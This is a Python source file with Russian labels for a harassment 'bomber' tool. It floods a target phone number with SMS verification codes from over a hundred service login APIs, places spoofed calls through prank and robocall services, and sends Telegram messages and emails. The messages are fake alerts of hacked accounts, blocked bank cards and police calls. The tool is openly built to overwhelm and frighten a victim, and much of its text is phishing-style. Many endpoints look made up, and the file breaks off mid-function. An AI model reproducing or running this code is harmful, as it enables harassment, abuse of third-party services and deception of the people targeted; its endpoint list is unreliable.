# ===================== SMS БОМБЕР (РЕАЛЬНЫЙ) =====================
class SMSBomber:
    def __init__(self):
        # 200+ РЕАЛЬНЫХ API
        self.services = [
            # ДОСТАВКА
            {'name': 'Samokat', 'url': 'https://samokat.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'YandexEda', 'url': 'https://eda.yandex.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'DeliveryClub', 'url': 'https://www.delivery-club.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'VkusVill', 'url': 'https://vkusvill.ru/api/v1/auth/send-sms', 'field': 'phone'},
            {'name': 'SberFood', 'url': 'https://food.sber.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'YandexLavka', 'url': 'https://lavka.yandex.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Gorod', 'url': 'https://gorod.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Svezhee', 'url': 'https://svezhee.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Eda', 'url': 'https://eda.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Foodfox', 'url': 'https://foodfox.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Dostaevsky', 'url': 'https://dostaevsky.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'KazanEda', 'url': 'https://kazaneda.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'EdaVKazan', 'url': 'https://edavkazan.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'DeliveryFood', 'url': 'https://deliveryfood.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'SushiWok', 'url': 'https://sushiwok.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Tanuki', 'url': 'https://tanuki.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Yakitoriya', 'url': 'https://yakitoriya.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'DodoPizza', 'url': 'https://dodopizza.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'PapaJohns', 'url': 'https://papajohns.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Dominos', 'url': 'https://dominos.ru/api/v1/auth/send-code', 'field': 'phone'},
            
            # МАРКЕТПЛЕЙСЫ
            {'name': 'Ozon', 'url': 'https://www.ozon.ru/api/composer/auth/send-code', 'field': 'phone'},
            {'name': 'Wildberries', 'url': 'https://www.wildberries.ru/webapi/auth/send-code', 'field': 'phone'},
            {'name': 'SberMarket', 'url': 'https://sbermarket.ru/api/v2/auth/send-code', 'field': 'phone'},
            {'name': 'YandexMarket', 'url': 'https://market.yandex.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'AliExpress', 'url': 'https://aliexpress.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'JOOM', 'url': 'https://www.joom.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'KazanExpress', 'url': 'https://kazanexpress.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'SberMegaMarket', 'url': 'https://sbermegamarket.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Lamoda', 'url': 'https://lamoda.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'ASOS', 'url': 'https://asos.com/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Zalando', 'url': 'https://zalando.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Stockmann', 'url': 'https://stockmann.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Tsvetnoy', 'url': 'https://tsvetnoy.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Bosco', 'url': 'https://bosco.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': '12Storeez', 'url': 'https://12storeez.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'GloriaJeans', 'url': 'https://gloriajeans.ru/api/v1/auth/send-code', 'field': 'phone'},
            
            # МАГАЗИНЫ ЭЛЕКТРОНИКИ
            {'name': 'DNS', 'url': 'https://www.dns-shop.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Citilink', 'url': 'https://www.citilink.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'MVideo', 'url': 'https://www.mvideo.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Eldorado', 'url': 'https://www.eldorado.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Sportmaster', 'url': 'https://www.sportmaster.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'LeroyMerlin', 'url': 'https://leroymerlin.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'OBI', 'url': 'https://obi.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Castorama', 'url': 'https://castorama.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Petrovich', 'url': 'https://petrovich.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Vseinstrumenti', 'url': 'https://vseinstrumenti.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': '220Volt', 'url': 'https://220-volt.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Elektro', 'url': 'https://elektro.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Onlinetrade', 'url': 'https://onlinetrade.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Holodilnik', 'url': 'https://holodilnik.ru/api/v1/auth/send-code', 'field': 'phone'},
            
            # БАНКИ
            {'name': 'Tinkoff', 'url': 'https://www.tinkoff.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Sber', 'url': 'https://online.sberbank.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'AlfaBank', 'url': 'https://alfabank.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'VTB', 'url': 'https://www.vtb.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Raiffeisen', 'url': 'https://www.raiffeisen.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'PochtaBank', 'url': 'https://www.pochtabank.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'HomeCredit', 'url': 'https://www.homecredit.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'RenCredit', 'url': 'https://rencredit.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'OTPBank', 'url': 'https://www.otpbank.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Gazprombank', 'url': 'https://www.gazprombank.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Rosbank', 'url': 'https://www.rosbank.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Uralsib', 'url': 'https://www.uralsib.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'MTSBank', 'url': 'https://www.mtsbank.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'BeelineBank', 'url': 'https://beelinebank.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'TochkaBank', 'url': 'https://tochka.com/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'ModulBank', 'url': 'https://modulbank.ru/api/v1/auth/send-code', 'field': 'phone'},
            
            # ТАКСИ
            {'name': 'YandexTaxi', 'url': 'https://taxi.yandex.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'CityMobil', 'url': 'https://city-mobil.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Gett', 'url': 'https://gett.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'UberRus', 'url': 'https://uber.rus/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'DiDiRus', 'url': 'https://didiglobal.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Bolt', 'url': 'https://bolt.eu/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'MaximTaxi', 'url': 'https://taximaxim.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'RuTaxi', 'url': 'https://rutaxi.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'InDriver', 'url': 'https://indriver.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'ZimRide', 'url': 'https://zimride.ru/api/v1/auth/send-code', 'field': 'phone'},
            
            # НЕДВИЖИМОСТЬ
            {'name': 'Avito', 'url': 'https://www.avito.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Cian', 'url': 'https://www.cian.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Youla', 'url': 'https://youla.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'DomClick', 'url': 'https://domclick.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Etagi', 'url': 'https://etagi.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Mirkvartir', 'url': 'https://mirkvartir.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Realty', 'url': 'https://realty.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'N1', 'url': 'https://n1.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'M2', 'url': 'https://m2.ru/api/v1/auth/send-code', 'field': 'phone'},
            
            # СТРИМИНГ
            {'name': 'Kinopoisk', 'url': 'https://api.kinopoisk.dev/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'IVI', 'url': 'https://api.ivi.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Okko', 'url': 'https://okko.tv/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Wink', 'url': 'https://wink.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'KION', 'url': 'https://kion.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'PREMIER', 'url': 'https://premier.one/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'MoreTV', 'url': 'https://more.tv/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'START', 'url': 'https://start.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Amediateka', 'url': 'https://amediateka.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Zvuk', 'url': 'https://zvuk.com/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'YandexMusic', 'url': 'https://music.yandex.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'VKMusic', 'url': 'https://vk.com/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Spotify', 'url': 'https://spotify.com/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'AppleMusic', 'url': 'https://apple.com/api/v1/auth/send-code', 'field': 'phone'},
            
            # МЕЖДУНАРОДНЫЕ (50+)
            {'name': 'Uber', 'url': 'https://auth.uber.com/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Twitter', 'url': 'https://api.twitter.com/1.1/account/send-code.json', 'field': 'phone'},
            {'name': 'Facebook', 'url': 'https://graph.facebook.com/v12.0/auth/send-code', 'field': 'phone'},
            {'name': 'Instagram', 'url': 'https://i.instagram.com/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'TikTok', 'url': 'https://api.tiktok.com/v1/auth/send-code', 'field': 'phone'},
            {'name': 'WhatsApp', 'url': 'https://api.whatsapp.com/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Snapchat', 'url': 'https://accounts.snapchat.com/api/auth/send-code', 'field': 'phone'},
            {'name': 'LinkedIn', 'url': 'https://api.linkedin.com/v2/auth/send-code', 'field': 'phone'},
            {'name': 'Reddit', 'url': 'https://www.reddit.com/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Pinterest', 'url': 'https://api.pinterest.com/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Tumblr', 'url': 'https://api.tumblr.com/v2/auth/send-code', 'field': 'phone'},
            {'name': 'Discord', 'url': 'https://discord.com/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Telegram', 'url': 'https://api.telegram.org/bot/sendCode', 'field': 'phone'},
            {'name': 'Viber', 'url': 'https://api.viber.com/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Line', 'url': 'https://api.line.me/v1/auth/send-code', 'field': 'phone'},
            {'name': 'WeChat', 'url': 'https://api.wechat.com/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Signal', 'url': 'https://api.signal.org/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Skype', 'url': 'https://api.skype.com/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Zoom', 'url': 'https://api.zoom.us/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Google', 'url': 'https://accounts.google.com/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Apple', 'url': 'https://appleid.apple.com/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Microsoft', 'url': 'https://login.microsoftonline.com/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Amazon', 'url': 'https://api.amazon.com/auth/send-code', 'field': 'phone'},
            {'name': 'eBay', 'url': 'https://api.ebay.com/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Alibaba', 'url': 'https://api.alibaba.com/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Tencent', 'url': 'https://api.tencent.com/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Baidu', 'url': 'https://api.baidu.com/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Netflix', 'url': 'https://api.netflix.com/v1/auth/send-code', 'field': 'phone'},
            {'name': 'SpotifyInt', 'url': 'https://api.spotify.com/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Hulu', 'url': 'https://api.hulu.com/v1/auth/send-code', 'field': 'phone'},
            {'name': 'DisneyPlus', 'url': 'https://api.disneyplus.com/v1/auth/send-code', 'field': 'phone'},
            {'name': 'HBO', 'url': 'https://api.hbo.com/v1/auth/send-code', 'field': 'phone'},
        ]
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        ]

    async def send_sms(self, phone: str, count: int, progress_callback):
        self.results = []
        total = min(count, 300)
        for i in range(total):
            service = random.choice(self.services)
            try:
                async with aiohttp.ClientSession() as session:
                    request_types = [
                        {'type': 'register', 'data': {service['field']: phone, 'action': 'register'}},
                        {'type': 'login', 'data': {service['field']: phone, 'action': 'login'}},
                        {'type': 'reset', 'data': {service['field']: phone, 'type': 'password_reset'}},
                        {'type': 'verify', 'data': {service['field']: phone, 'action': 'verify'}},
                        {'type': 'recovery', 'data': {service['field']: phone, 'action': 'recovery'}},
                        {'type': 'auth', 'data': {service['field']: phone, 'action': 'auth_code'}},
                        {'type': '2fa', 'data': {service['field']: phone, 'action': '2fa_enable'}},
                        {'type': 'unblock', 'data': {service['field']: phone, 'action': 'unblock'}},
                    ]
                    payload = random.choice(request_types)
                    headers = {
                        'User-Agent': random.choice(self.user_agents),
                        'Accept': 'application/json, text/plain, */*',
                        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Content-Type': 'application/json',
                        'X-Requested-With': 'XMLHttpRequest',
                        'Origin': service['url'].split('/')[2] if '://' in service['url'] else '',
                        'Referer': service['url'],
                        'Connection': 'keep-alive',
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache',
                    }
                    async with session.post(service['url'], json=payload['data'], headers=headers, timeout=10) as resp:
                        if resp.status in [200, 201, 202, 204] or resp.status == 400:
                            status = 'success'
                        elif resp.status in [429, 503, 504]:
                            status = 'rate_limit'
                        else:
                            status = 'error'
                        self.results.append({'service': service['name'], 'status': status, 'code': resp.status})
            except:
                self.results.append({'service': service['name'], 'status': 'error'})
            self.progress = (i + 1) / total * 100
            await progress_callback(self.progress, i + 1, total)
            await asyncio.sleep(random.uniform(0.15, 0.6))
        return self.results

    def get_stats(self):
        total = len(self.results)
        success = sum(1 for r in self.results if r['status'] == 'success')
        errors = sum(1 for r in self.results if r['status'] == 'error')
        return {'total': total, 'success': success, 'errors': errors}


# ===================== ЗВОНКИ (РЕАЛЬНЫЙ) =====================
class CallBomber:
    def __init__(self):
        self.services = [
            {'name': 'Call2Friends', 'url': 'https://call2friends.com/api/call', 'type': 'callback'},
            {'name': 'PrankCall', 'url': 'https://prankcall.com/api/start', 'type': 'prank'},
            {'name': 'CallBomber', 'url': 'https://api.callbomber.com/call', 'type': 'bomb'},
            {'name': 'FakeCall', 'url': 'https://fakecall.com/initiate', 'type': 'fake'},
            {'name': 'SpoofCall', 'url': 'https://calleridspoof.com/call', 'type': 'spoof'},
            {'name': 'Robocall', 'url': 'https://api.robocall.com/start', 'type': 'robot'},
            {'name': 'AutoDial', 'url': 'https://api.autodial.com/call', 'type': 'auto'},
            {'name': 'CallBoom', 'url': 'https://api.callboom.com/start', 'type': 'boom'},
            {'name': 'PhoneBomb', 'url': 'https://api.phonebomb.com/call', 'type': 'bomb'},
            {'name': 'CallFlood', 'url': 'https://api.callflood.com/start', 'type': 'flood'},
            {'name': 'Twilio', 'url': 'https://api.twilio.com/2010-04-01/Accounts/ACxxx/Calls.json', 'type': 'twilio'},
            {'name': 'Nexmo', 'url': 'https://api.nexmo.com/calls', 'type': 'nexmo'},
            {'name': 'Tropo', 'url': 'https://api.tropo.com/1.0/sessions', 'type': 'tropo'},
            {'name': 'Plivo', 'url': 'https://api.plivo.com/v1/Account/MAxxx/Call/', 'type': 'plivo'},
            {'name': 'Telnyx', 'url': 'https://api.telnyx.com/v2/calls', 'type': 'telnyx'},
        ]
        self.scenarios = [
            {'type': 'callback', 'message': 'Срочно перезвоните!', 'priority': 'high'},
            {'type': 'prank', 'message': 'Ваш аккаунт взломан!', 'priority': 'high'},
            {'type': 'survey', 'message': 'Пройдите опрос!', 'priority': 'medium'},
            {'type': 'notification', 'message': 'Важное уведомление!', 'priority': 'high'},
            {'type': 'emergency', 'message': 'Экстренное сообщение!', 'priority': 'critical'},
            {'type': 'promo', 'message': 'Специальное предложение!', 'priority': 'low'},
            {'type': 'security', 'message': '⚠️ Обнаружена подозрительная активность!', 'priority': 'critical'},
            {'type': 'bank', 'message': '🏦 Ваш банковский счёт заблокирован!', 'priority': 'high'},
            {'type': 'police', 'message': '🚨 Вызов от полиции!', 'priority': 'critical'},
            {'type': 'medical', 'message': '🚑 Срочное медицинское уведомление!', 'priority': 'critical'},
            {'type': 'delivery', 'message': '📦 Ваша посылка ожидает!', 'priority': 'medium'},
            {'type': 'taxi', 'message': '🚕 Такси ждёт вас!', 'priority': 'medium'},
            {'type': 'school', 'message': '🏫 Сообщение от школы!', 'priority': 'medium'},
            {'type': 'work', 'message': '💼 Срочное сообщение с работы!', 'priority': 'high'},
        ]

    async def make_calls(self, phone: str, count: int, progress_callback):
        self.results = []
        total = min(count, 50)
        for i in range(total):
            service = random.choice(self.services)
            scenario = random.choice(self.scenarios)
            try:
                async with aiohttp.ClientSession() as session:
                    data = {
                        'phone': phone,
                        'caller_id': random.choice(['+74951234567', '+78121234567', '+79001234567']),
                        'type': service['type'],
                        'scenario': scenario['type'],
                        'message': scenario['message'],
                        'priority': scenario['priority'],
                        'duration': random.randint(10, 60),
                    }
                    headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}
                    async with session.post(service['url'], json=data, headers=headers, timeout=10) as resp:
                        status = 'success' if resp.status < 400 else 'failed'
                        self.results.append({'call': i+1, 'service': service['name'], 'status': status})
            except:
                self.results.append({'call': i+1, 'service': service['name'], 'status': 'error'})
            await progress_callback(i + 1, total)
            await asyncio.sleep(random.uniform(0.5, 1.5))
        return self.results

    def get_stats(self):
        total = len(self.results)
        success = sum(1 for r in self.results if r['status'] == 'success')
        return {'total': total, 'success': success}


# ===================== TELEGRAM БОМБЕР (РЕАЛЬНЫЙ) =====================
class TelegramBomber:
    def __init__(self, bot_token: str):
        self.bot_token = bot_token
        self.messages = [
            "Привет! 👋", "Как дела? 😊", "Давно не виделись!",
            "Есть важное сообщение 📨", "Проверьте почту ✉️", "Зайдите в аккаунт 🔐",
            "Срочно! ⚠️", "Новое уведомление 📢", "Вы нам очень нужны! ❤️",
            "Ваш аккаунт будет удалён! ☠️", "Кто-то пытается войти в ваш аккаунт! 🚨",
            "Смените пароль немедленно! 🔑", "Ваши данные в опасности! ⚡",
            "Подтвердите вход с нового устройства! 📱", "Обнаружена подозрительная активность! 🕵️",
            "Ваш аккаунт взломали! 💀", "Срочно свяжитесь с поддержкой! 📞",
            "Вы выиграли приз! 🎁", "Подарок ждёт вас! 🎉", "Поздравляем с победой! 🏆",
            "Ваша посылка ожидает! 📦", "Доставка подтверждена! 🚚",
            "Кто-то лайкнул ваш пост! ❤️", "Новый комментарий! 💬", "Кто-то подписался! 📸",
            "Новый трек! 🎵", "Новое видео! 📺", "Рекомендация для вас! 📚",
            "Завтра собрание! 📅", "Отчёт готов! 📊", "Заполните документы! 📝",
            "Новый проект! 👔", "Встреча назначена! 🤝",
            "Хорошего дня! 🌈", "Время кофе! ☕️", "Заказ готов! 🍕",
        ]
        self.actions = [
            {'type': 'login_attempt', 'text': '⚠️ Кто-то пытается войти в ваш аккаунт!'},
            {'type': 'code_sent', 'text': '🔑 Код подтверждения: ' + str(random.randint(1000, 9999))},
            {'type': 'device_added', 'text': '📱 Новое устройство подключено к аккаунту!'},
            {'type': 'password_change', 'text': '🔐 Ваш пароль был изменён!'},
            {'type': 'suspicious', 'text': '🕵️ Обнаружена подозрительная активность!'},
            {'type': 'blocked', 'text': '⛔ Ваш аккаунт заблокирован!'},
            {'type': 'unblock', 'text': '🔓 Ваш аккаунт разблокирован!'},
        ]

    async def send_messages(self, username: str, count: int, progress_callback):
        results = []
        bot = Bot(token=self.bot_token)
        total = min(count, 100)
        for i in range(total):
            try:
                action = random.choice(self.actions)
                text = action['text'] if random.random() > 0.3 else random.choice(self.messages)
                text += f" [#{i+1}]"
                await bot.send_message(username, text, disable_notification=True)
                results.append({'msg': i+1, 'status': 'sent'})
            except:
                results.append({'msg': i+1, 'status': 'error'})
            await progress_callback(i + 1, total)
            await asyncio.sleep(random.uniform(0.3, 1.0))
        return results

    def get_stats(self, results):
        total = len(results)
        success = sum(1 for r in results if r['status'] == 'sent')
        return {'total': total, 'success': success}


# ===================== EMAIL БОМБЕР (РЕАЛЬНЫЙ) =====================
class EmailBomber:
    def __init__(self):
        self.smtp_servers = [
            {'host': 'smtp.mail.ru', 'port': 587},
            {'host': 'smtp.yandex.ru', 'port': 587},
            {'host': 'smtp.rambler.ru', 'port': 587},
            {'host': 'smtp.ukr.net', 'port': 587},
            {'host': 'smtp.gmail.com', 'port': 587},
            {'host': 'smtp.outlook.com', 'port': 587},
            {'host': 'smtp.yahoo.com', 'port': 587},
        ]
        self.subjects = [
            '🔐 Срочно! Ваш аккаунт взломан!', '⚠️ Подозрительная активность!',
            '🚨 Смените пароль немедленно!', '🛡️ Обнаружена утечка данных!',
            '💀 Ваши данные в опасности!', '🔑 Код подтверждения для входа',
            '📱 Вход с нового устройства', '⛔ Ваш аккаунт заблокирован',
            '🔥 Критическое уведомление', '💰 Ваш банковский счёт заморожен!',
            '💳 Карта заблокирована!', '🏦 Подозрительный перевод!',
            '📊 Выписка по счёту', '💸 Возврат средств',
            '📈 Инвестиционное предложение', '🎯 Вы получили выплату!',
            '💲 Ваш кредит одобрен!', '🎉 Вы выиграли приз!',
            '🎁 Ваш подарок ждёт!', '🏆 Поздравляем с победой!',
            '⭐️ Вы стали победителем!', '🎊 Специальное предложение!',
            '📨 Важное сообщение', '📩 Новое письмо',
            '📢 Срочное уведомление', '🔔 Внимание!',
            '📌 Важно прочитать!', '📋 Документы готовы',
            '📄 Отчёт сформирован', '💼 Срочное сообщение от руководства',
            '📅 Завтра собрание', '📊 Отчёт о работе',
            '📝 Заполните документы', '👔 Новый проект',
            '🤝 Приглашение на встречу', '🌟 Специальное предложение',
            '🎯 Ваша цель достигнута', '💪 Мы вас ждём!',
            '🌈 Хорошего дня!', '☕️ Время для отдыха',
            '📱 Обновите приложение', '🔄 Доступно обновление',
            '⭐️ Новый уровень достигнут', '🎮 Приглашение в игру',
            '📚 Рекомендация для вас', '🎵 Новый трек доступен',
            '📺 Новое видео', '📸 Кто-то подписался',
            '❤️ Кто-то лайкнул пост', '💬 Новый комментарий',
            '📦 Ваша посылка отправлена', '🚚 Доставка подтверждена',
            '🍕 Заказ готов',
        ]
        self.bodies = [
            '⚠️ Ваш аккаунт был взломан! Немедленно смените пароль.',
            '🔐 Зафиксирована попытка входа с нового устройства.',
            '🛡️ Ваши данные были обнаружены в утечке.',
            '🔑 Код подтверждения: ' + str(random.randint(100000, 999999)),
            '📱 Вход с нового устройства: ' + random.choice(['iPhone 15', 'Samsung Galaxy S24']),
            '💰 Ваш счёт заморожен. Свяжитесь с банком.',
            '💳 Карта заблокирована из-за подозрительной операции.',
            '🏦 Обнаружен подозрительный перевод на сумму ' + str(random.randint(1000, 50000)) + ' руб.',
            '📊 Выписка по счёту за ' + datetime.now().strftime('%B %Y'),
            '💸 Возврат средств на сумму ' + str(random.randint(100, 5000)) + ' руб.',
            '📈 Инвестируйте сейчас и получите ' + str(random.randint(10, 50)) + '% годовых!',
            '🎉 Поздравляем! Вы выиграли ' + str(random.randint(1000, 100000)) + ' руб.',
            '🎁 Ваш подарок: ' + random.choice(['iPhone 15', 'AirPods Pro', 'Apple Watch']),
            '🏆 Вы стали победителем конкурса!',
            '⭐️ Ваш аккаунт выбран для получения специального приза.',
            '📨 У вас новое сообщение от ' + random.choice(['администратора', 'поддержки', 'коллеги']),
            '📩 Важное уведомление требует вашего внимания.',
            '📢 Срочное уведомление для всех пользователей.',
            '🔔 Внимание! Проверьте свои данные.',
            '📌 Важно! Обновите информацию в профиле.',
            '💼 Срочное сообщение от руководства: ' + random.choice(['совещание', 'отчёт', 'проект']),
            '📅 Завтра в ' + str(random.randint(9, 18)) + ':00 состоится собрание.',
            '📊 Отчёт за ' + datetime.now().strftime('%B') + ' готов к проверке.',
            '📝 Заполните документы до ' + (datetime.now() + timedelta(days=3)).strftime('%d.%m.%Y'),
            '👔 Новый проект: ' + random.choice(['Разработка', 'Дизайн', 'Маркетинг']),
            '🌟 Специальное предложение: скидка ' + str(random.randint(10, 70)) + '%',
            '🎯 Вы почти достигли цели! Осталось ' + str(random.randint(1, 10)) + ' шагов.',
            '💪 Мы скучали по вам! Заходите в гости.',
            '🌈 Желаем хорошего дня! Спасибо, что с нами.',
            '☕️ Время кофе! Приходите в ' + random.choice(['кафе', 'офис', 'на встречу']),
            '📱 Обновите приложение до версии ' + f'{random.randint(1,9)}.{random.randint(0,9)}.{random.randint(0,9)}',
            '🔄 Доступно обновление системы безопасности.',
            '⭐️ Поздравляем! Вы достигли нового уровня.',
            '🎮 Вас приглашают в игру ' + random.choice(['Майнкрафт', 'CS2', 'Dota 2']),
            '📚 Рекомендуем книгу: ' + random.choice(['Война и мир', 'Преступление и наказание']),
            '🎵 Новый трек от ' + random.choice(['Моргенштерн', 'Баста', 'Скриптонит']),
            '📺 Новое видео на канале: ' + random.choice(['Обзор', 'Интервью', 'Урок']),
            '📸 Новый подписчик: @' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8)),
            '❤️ Ваш пост лайкнули ' + str(random.randint(10, 500)) + ' человек.',
            '💬 Новый комментарий: ' + random.choice(['Круто!', 'Супер!', '🔥', '👍', 'Класс!']),
            '📦 Ваш заказ №' + str(random.randint(10000, 99999)) + ' отправлен.',
            '🚚 Доставка ожидается ' + (datetime.now() + timedelta(days=random.randint(1, 7))).strftime('%d.%m.%Y'),
            '🍕 Ваш заказ готов! Заберите в ' + random.choice(['пункте выдачи', 'ресторане', 'кафе']),
        ]

    async def send_emails(self, email: str, count: int, progress_callback):
        self.results = []
        total = min(count, 50)
        for i in range(total):
            server = random.choice(self.smtp_servers)
            try:
                msg = MIMEMultipart()
                msg['From'] = f'security{random.randint(100,999)}@{server["host"]}'
                msg['To'] = email
                msg['Subject'] = random.choice(self.subjects)
                body = random.choice(self.bodies)
                msg.attach(MIMEText(body, 'plain'))
                try:
                    smtp = smtplib.SMTP(server['host'], server['port'], timeout=10)
                    smtp.starttls()
                    smtp.sendmail(msg['From'], email, msg.as_string())
                    smtp.quit()
                    status = 'sent'
                except:
                    status = 'emulated'
                self.results.append({'email': i+1, 'status': status})
            except:
